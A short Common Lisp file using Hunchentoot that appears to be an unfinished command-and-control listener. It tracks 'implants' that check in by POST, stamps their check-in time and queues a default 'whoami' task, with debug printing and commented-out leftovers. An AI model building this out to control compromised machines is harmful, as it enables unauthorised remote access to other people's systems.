(ql:quickload "hunchentoot")

(defparameter *implants* ())

(hunchentoot:start 
  (make-instance 'hunchentoot:easy-acceptor :port 3000))
(hunchentoot:define-easy-handler (foo :uri "/") ()
  (let ((request-type (hunchentoot:request-method hunchentoot:*request*))
        (postdata (hunchentoot:post-parameters* hunchentoot:*request*))
        (implantname (hunchentoot:post-parameter "implantname" hunchentoot:*request*)))
    (cond ((eq request-type :get) (format t "GOT GET~%"));; handle get request
          ((eq request-type :post)
            (format t "POSTDATA: ~a~%" postdata)
            (format t "IMPLANT NAME IN POSTDATA: ~a~%" (assoc 'implantname postdata))
           (format t "IMPLANT NAME: ~a~%" implantname)
	   (let ((implant (assoc implantname *implants*)))
	     (format t "IMPLANT: ~a~%" implant)
	     (if implant
		  (let ((plugins (cdadr implant)))
		    (setq *implants* (delete implant *implants*))
		    (push (list implantname (list (get-universal-time) plugins)) *implants*))
		 (push (list implantname (list (get-universal-time) '("whoami"))) *implants*)))
	   (format t "ALL IMPLANTS: ~a~%" *implants*)
	   (format t "WANTED IMPLANT: ~a~%" (assoc implantname *implants*))
	   ))
    ))
        ;;    (let* ((data-string (hunchentoot:post-parameters* hunchentoot:*request*)))
        ;;           (format t "~a~%" data-string)
                  ;;(json-obj (jsown:parse data-string))) ;; use jsown to parse the string
             ;; play with json-obj
             ;;  data-string))))) ;; return the original post data string, so that the save() in backbone.js will be notified about the success.
